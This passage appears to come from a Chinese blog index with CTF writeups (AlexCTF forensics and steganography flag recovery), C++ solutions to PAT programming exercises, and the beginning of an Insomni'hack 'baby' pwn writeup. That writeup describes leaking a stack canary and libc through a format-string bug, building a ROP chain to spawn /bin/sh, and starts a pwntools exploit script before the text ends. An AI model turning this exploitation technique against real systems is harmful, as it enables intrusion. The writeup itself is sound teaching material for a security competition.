class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format<span class="regexp">/_flag.extracted/</span>kindle_out$ ls</div><div class="line"><span class="number">2540270001</span><span class="number">-2692310002.</span>ffs  flag.txt  rootfs_md5_list.tar.gz  update-patches.tar.gz</div><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format<span class="regexp">/_flag.extracted/</span>kindle_out$ cat flag.txt </div><div class="line">ALEXCTF&#123;Wh0_N33d5_K1nDl3_t0_3X7R4Ct_K1ND13_F1rMw4R3&#125;</div></pre></td></tr></table></figure>
<h2 id="Scripting"><a href="#Scripting" class="headerlink" title="Scripting"></a>Scripting</h2><h2 id="Script2"><a href="#Script2" class="headerlink" title="Script2"></a>Script2</h2><p>找到原图。。比较一下，排除噪音，有不同的地方。</p>
<p><img src="/2017/02/07/AlexCTF-writeup/1.png" alt="1.jpg"></p>
<p>原图：</p>
<p><img src="/2017/02/07/AlexCTF-writeup/2.png" alt="2.png"></p>
<p>下面引用别人的答案：</p>
<blockquote>
<p>Some of that is noise. The pixels that look interesting are the 3 rows, where pixels seem to differ at somewhat regular intervals:</p>
<p>If we print out the x values of these pixels, we get:</p>
<p>4 17 36 60 68 85 101 120 132 147 165 180 196 214 231 251 260 275 292 305 325 340 357 371 389 415 420 440 452 473 484 500 4 21 37 63 69 83 100 117 132 147 165 178 196 213 229 244 261 275 293 319 324 340 356 383 388 414 421 436 453 479 485 500 4 24 36 53 69 89 103 125</p>
<p>Or in hex:</p>
<p>04 11 24 3c 44 55 65 78 84 93 a5 b4 c4 d6 e7 fb 104 113 124 131 145 154 165 173 185 19f 1a4 1b8 1c4 1d9 1e4 1f4 04 15 25 3f 45 53 64 75 84 93 a5 b2 c4 d5 e5 f4 105 113 125 13f 144 154 164 17f 184 19e 1a5 1b4 1c5 1df 1e5 1f4 04 18 24 35 45 59 67 7d</p>
<p>Note that the leading hex character always increments by 1. However, what happens when we look at just the lower 4 bits of each position in hex?</p>
<p>414c45584354467b434154535f484944455f534543524554535f444f4e545f544845597d</p>
<p>That looks like ASCII! It decodes to ALEXCTF{CATS_HIDE_SECRETS_DONT_THEY}.</p>
</blockquote>
<p>flag.py</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">import binascii</div><div class="line"><span class="built_in">from</span> PIL import Image</div><div class="line"></div><div class="line"><span class="built_in">new</span> = Image.<span class="built_in">open</span>(<span class="string">'cat_with_secrets.png'</span>).<span class="built_in">load</span>()</div><div class="line">old = Image.<span class="built_in">open</span>(<span class="string">'cat_with_secrets_original.jpg'</span>).<span class="built_in">load</span>()</div><div class="line"></div><div class="line">width = <span class="number">512</span></div><div class="line"></div><div class="line">in_hex = <span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">3</span>):</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">        <span class="keyword">if</span> (y, x) &lt;= (<span class="number">2</span>, <span class="number">125</span>) <span class="keyword">and</span> <span class="built_in">new</span>[x, y] != old[x, y]:</div><div class="line">            in_hex += <span class="string">'%x'</span> % (x % <span class="number">16</span>)</div><div class="line"></div><div class="line">print(binascii.unhexlify(in_hex))</div></pre></td></tr></table></figure>
<p>当然了简单的方法，<code>pip install steganography</code>，然后run<code>steganography -d cat-with-secrets.png</code></p>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/07/AlexCTF-writeup/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-PAT-advanced-1002" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/03/PAT-advanced-1002/">PAT advanced 1002</a>
    </h1>
  

        
        <a href="/2017/02/03/PAT-advanced-1002/" class="archive-article-date">
  	<time datetime="2017-02-02T16:30:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-03</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>1002.A+B for Polynomials (25)</p>
<p>Input</p>
<p>Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 … NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, …, K) are the exponents and coefficients, respectively. It is given that 1 &lt;= K &lt;= 10，0 &lt;= NK &lt; … &lt; N2 &lt; N1 &lt;=1000.</p>
<p>Output</p>
<p>For each test case you should output the sum of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate to 1 decimal place.</p>
<p>Sample Input<br>2 1 2.4 0 3.2<br>2 2 1.5 1 0.5</p>
<p>Sample Output<br>3 2 1.5 1 2.9 0 3.2</p>
</blockquote>
<p>注意保留1位精度，注意把0挑出来</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> k1;</div><div class="line"><span class="keyword">int</span> k2;</div><div class="line"><span class="keyword">int</span> k3 = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</div><div class="line"><span class="keyword">float</span> a[<span class="number">1001</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">float</span> b[<span class="number">1001</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">float</span> c[<span class="number">1001</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">cin</span> &gt;&gt; k1;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k1; i++)&#123; <span class="keyword">int</span> tmp; <span class="built_in">cin</span> &gt;&gt; tmp; <span class="built_in">cin</span> &gt;&gt; a[tmp]; &#125;</div><div class="line">	<span class="built_in">cin</span> &gt;&gt; k2;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k2; i++)&#123; <span class="keyword">int</span> tmp; <span class="built_in">cin</span> &gt;&gt; tmp; <span class="built_in">cin</span> &gt;&gt; b[tmp]; &#125;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1000</span>; i &gt; <span class="number">-1</span>; i--)</div><div class="line">	&#123; </div><div class="line">		c[i] = a[i] + b[i]; </div><div class="line">		<span class="keyword">if</span> (c[i])</div><div class="line">			k3++;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (k3) &#123; <span class="built_in">cout</span> &lt;&lt; k3 &lt;&lt; <span class="string">' '</span>; &#125;</div><div class="line">	<span class="keyword">else</span> &#123; <span class="built_in">cout</span> &lt;&lt; k3 &lt;&lt; <span class="built_in">endl</span>; <span class="keyword">return</span> <span class="number">0</span>; &#125;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; !c[i]; i++)&#123; flag = i + <span class="number">1</span>; &#125;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1000</span>; i &gt; <span class="number">-1</span>; i--)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span> (c[i] &amp;&amp; i != flag)</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"%d %.1f "</span>, i, c[i]);</div><div class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (c[i] &amp;&amp; i == flag)</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"%d %.1f\n"</span>, i, c[i]);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PAT</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/03/PAT-advanced-1002/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-PAT-advanced-1001" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/02/PAT-advanced-1001/">PAT advanced 1001</a>
    </h1>
  

        
        <a href="/2017/02/02/PAT-advanced-1001/" class="archive-article-date">
  	<time datetime="2017-02-01T16:02:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-02</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>1001.A+B Format(20)<br>时间限制<br>400 ms<br>内存限制<br>65536 kB<br>代码长度限制<br>16000 B<br>判题程序<br>Standard<br>作者<br>CHEN, Yue<br>Calculate a + b and output the sum in standard format – that is, the digits must be separated into groups of three by commas (unless there are less than four digits).</p>
<p>Input</p>
<p>Each input file contains one test case. Each case contains a pair of integers a and b where -1000000 &lt;= a, b &lt;= 1000000. The numbers are separated by a space.</p>
<p>Output</p>
<p>or each test case, you should output the sum of a and b in one line. The sum must be written in the standard format.</p>
<p>Sample Input<br>-1000000 9<br>Sample Output<br>-999,991</p>
</blockquote>
<p>暴力可以解决PAT上不少问题= =</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> flag = <span class="number">0</span>;</div><div class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">	LL a, b, c;</div><div class="line">	<span class="keyword">int</span> num[<span class="number">20</span>];</div><div class="line">	<span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</div><div class="line">	c = a + b;</div><div class="line">	<span class="keyword">if</span> (c &lt; <span class="number">0</span>)&#123; flag = <span class="number">1</span>; c = -c; &#125;</div><div class="line">	<span class="keyword">if</span> (flag)<span class="built_in">cout</span> &lt;&lt; <span class="string">'-'</span>;</div><div class="line">	<span class="keyword">if</span> (c == <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		num[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">		j = <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">while</span> (c)&#123; num[j] = c % <span class="number">10</span>; c = c / <span class="number">10</span>; j++; &#125;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = j - <span class="number">1</span>; i &gt; <span class="number">-1</span>; i--)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">cout</span> &lt;&lt; num[i];</div><div class="line">		<span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span> &amp;&amp; i)</div><div class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">','</span>;</div><div class="line">	&#125;</div><div class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PAT</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/02/PAT-advanced-1001/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-PAT-advanced-1100" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/01/PAT-advanced-1100/">PAT advanced 1100</a>
    </h1>
  

        
        <a href="/2017/02/01/PAT-advanced-1100/" class="archive-article-date">
  	<time datetime="2017-02-01T14:10:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-01</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p> 1100.Mars Numbers(20)</p>
<p>Zero on Earth is called “tret” on Mars.<br>The numbers 1 to 12 on Earch is called “jan, feb, mar, apr, may, jun, jly, aug, sep, oct, nov, dec” on Mars, respectively.<br>For the next higher digit, Mars people name the 12 numbers as “tam, hel, maa, huh, tou, kes, hei, elo, syy, lok, mer, jou”, respectively.<br>For examples, the number 29 on Earth is called “hel mar” on Mars; and “elo nov” on Mars corresponds to 115 on Earth. In order to help communication between people from these two planets, you are supposed to write a program for mutual translation between Earth and Mars number systems.</p>
<p>Input Specification:</p>
<p>Each input file contains one test case. For each case, the first line contains a positive integer N (&lt; 100). Then N lines follow, each contains a number in [0, 169), given either in the form of an Earth number, or that of Mars.</p>
<p>Output Specification:</p>
<p>For each number, print in a line the corresponding number in the other language.</p>
<p>Sample Input:<br>4<br>29<br>5<br>elo nov<br>tam</p>
<p>Sample Output:<br>hel mar<br>may<br>115<br>13</p>
</blockquote>
<p>学习了<code>sscanf(&amp;src, format, &amp;dest)</code>这个函数，从<code>&amp;src</code>输入字符串到<code>&amp;dest</code>。<br>而且还有个坑，<code>13</code>在这里不是<code>tam tret</code>而是<code>tam</code></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="built_in">string</span> low[<span class="number">13</span>] = &#123; <span class="string">"tret"</span>, <span class="string">"jan"</span>, <span class="string">"feb"</span>, <span class="string">"mar"</span>, <span class="string">"apr"</span>, <span class="string">"may"</span>, <span class="string">"jun"</span>, <span class="string">"jly"</span>, <span class="string">"aug"</span>, <span class="string">"sep"</span>, <span class="string">"oct"</span>, <span class="string">"nov"</span>, <span class="string">"dec"</span> &#125;;</div><div class="line"><span class="built_in">string</span> high[<span class="number">13</span>] = &#123; <span class="string">""</span> ,<span class="string">"tam"</span>, <span class="string">"hel"</span>, <span class="string">"maa"</span>, <span class="string">"huh"</span>, <span class="string">"tou"</span>, <span class="string">"kes"</span>, <span class="string">"hei"</span>, <span class="string">"elo"</span>, <span class="string">"syy"</span>, <span class="string">"lok"</span>, <span class="string">"mer"</span>, <span class="string">"jou"</span> &#125;;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxSize = <span class="number">50</span>;</div><div class="line"><span class="keyword">char</span> s[maxSize];</div><div class="line"><span class="keyword">int</span> n, x, ans;</div><div class="line"><span class="built_in">string</span> current;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">while</span> (n--)</div><div class="line">	&#123;</div><div class="line">		gets(s);</div><div class="line">		<span class="keyword">if</span> (s[<span class="number">0</span>] &lt;= <span class="string">'9'</span> &amp;&amp; s[<span class="number">0</span>] &gt;= <span class="string">'0'</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">sscanf</span>(s, <span class="string">"%d"</span>, &amp;x);</div><div class="line">			<span class="keyword">if</span> (!(x / <span class="number">13</span>))&#123; <span class="built_in">cout</span> &lt;&lt; low[x] &lt;&lt; <span class="built_in">endl</span>; <span class="keyword">continue</span>; &#125;</div><div class="line">			<span class="keyword">if</span> (x / <span class="number">13</span> &amp;&amp; x % <span class="number">13</span>)&#123; <span class="built_in">cout</span> &lt;&lt; high[x / <span class="number">13</span>] &lt;&lt; <span class="string">' '</span> &lt;&lt; low[x % <span class="number">13</span>] &lt;&lt; <span class="built_in">endl</span>; <span class="keyword">continue</span>; &#125;</div><div class="line">			<span class="keyword">if</span> (x / <span class="number">13</span> &amp;&amp; !(x % <span class="number">13</span>))&#123; <span class="built_in">cout</span> &lt;&lt; high[x / <span class="number">13</span>] &lt;&lt; <span class="built_in">endl</span>; <span class="keyword">continue</span>; &#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span></div><div class="line">		&#123;</div><div class="line">			ans = <span class="number">0</span>;</div><div class="line">			<span class="keyword">if</span> (<span class="built_in">strlen</span>(s) != <span class="number">4</span>)</div><div class="line">			&#123;</div><div class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; !i || s[i - <span class="number">1</span>]; i += <span class="number">4</span>)</div><div class="line">				&#123;</div><div class="line">					current = <span class="string">""</span>;</div><div class="line">					<span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; i + <span class="number">3</span>; j++)</div><div class="line">						current += s[j];</div><div class="line">					<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++)</div><div class="line">					&#123;</div><div class="line">						<span class="keyword">if</span> (current == high[i]) ans += i * <span class="number">13</span>;</div><div class="line">						<span class="keyword">if</span> (current == low[i]) ans += i;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			<span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PAT</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/01/PAT-advanced-1100/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-2017Ins" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/01/2017Ins/">2017Insomni’hack teaser Pwn baby writeup</a>
    </h1>
  

        
        <a href="/2017/02/01/2017Ins/" class="archive-article-date">
  	<time datetime="2017-01-31T16:50:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-01</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>2017的第一场比赛，看了看，只会做一道forencis，pwn的baby还是很简单的，然而由于对canary的认识不足，导致如此简单的一道题目也不会。后面的pwn就没看了。</p>
<h2 id="baby-50"><a href="#baby-50" class="headerlink" title="baby 50"></a>baby 50</h2><p>有三个漏洞选项，stack overflow、fsb、heap overflow，checksec看下</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; checksec </div><div class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      <span class="keyword">FILE</span></div><div class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   <span class="regexp">/home/u</span>buntu<span class="regexp">/ctf-problem/</span><span class="number">2017</span>ins<span class="regexp">/pwn/</span>baby<span class="regexp">/baby</span></div></pre></td></tr></table></figure>
<p>WTF???居然保护全开了，这是最坑爹的了，当时看到canary我就不知道栈溢出该怎么用了，后来才知道<strong>canary是全局变量，每个进程中栈的canary是一样的，在进程运行时，先生成一个16byte的canary，然后随机从中选8byte填充，并且在后以’\00’结尾截断，不泄露栈地址</strong></p>
<p>dprintf函数原型<code>int dprintf(int fd, char* format[, ...])</code>，和printf很像，我理解就是加了一个重定向的printf，一样有fsb漏洞。</p>
<p>这题的思路，fsb泄露canary，libc，构造rop chain，stack overflow执行system(‘/bin/sh’)</p>
<p>现在的问题时，我们的canary在栈上的第几个参数？libc应该泄露哪个参数。</p>
<p>看了wp，发现分别时%138$llx、%158$llx。似乎大家都知道这个事。。。</p>
<p>然后libc泄露的是<code>__libc_start_main+0xf0</code>的地址，所以得到的地址减<code>0xf0-__libc_start_main</code></p>
<p>64位的参数传递rdi, rsi, rdx, rcx, r8, r9。注意下<code>dup2()</code>这个函数，这个函数用来重定向，原型<code>int dup2(int odlfd, int newfd)</code>。</p>
<blockquote>
<p>dup2和dup函数一样，只是返回的文件描述符可以通过第二个参数”可用的文件描述符“指定。如果“可用的文件描述符“是打开状态，则会被关闭；如果”现存的文件描述符“和”可用的文件描述符“一样，则不会关闭.</p>
</blockquote>
<p>但是我这里还是有个地方不明白，在这里dup2()的oldfd参数为什么是4和0、1、2；0、1、2分别表示标准输入、标准输出、标准错误输出，然后每打开一个新文件返回没有被使用的fd的最小值。这里打开了标准输入输出，至于为什么是4我还没搞懂= =</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># rdi, rsi, rdx, rcx, r8, r9</span></div><div class="line"><span class="comment"># int dup2(int odlfd, int newfd)</span></div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dofmt</span><span class="params">(payload)</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'Your choice &gt; '</span>)</div><div class="line">	p.sendline(<span class="string">'2'</span>)</div><div class="line">	p.recvuntil(<span class="string">'Your format &gt; '</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	<span class="keyword">return</span> p.recvline()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dostack</span><span class="params">()</span>:</span></div><div class="line">    p.send(<span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Your choice &gt; '</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">'send ? 